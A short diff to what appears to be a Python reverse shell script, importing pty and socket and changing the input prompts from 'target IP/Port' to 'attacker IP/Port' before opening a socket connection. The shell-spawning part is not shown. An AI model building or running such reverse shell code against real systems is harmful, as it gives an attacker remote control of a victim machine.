@@ -5,8 +5,8 @@ import pty
 import socket
 import sys
 
-target_ip = input("Please input the target IP: ")
-target_port = input("Please input the target Port: ")
+target_ip = input("Please input the attacker IP: ")
+target_port = input("Please input the attacker Port: ")
 
 #Create and connect to socket
 s = socket.socket()
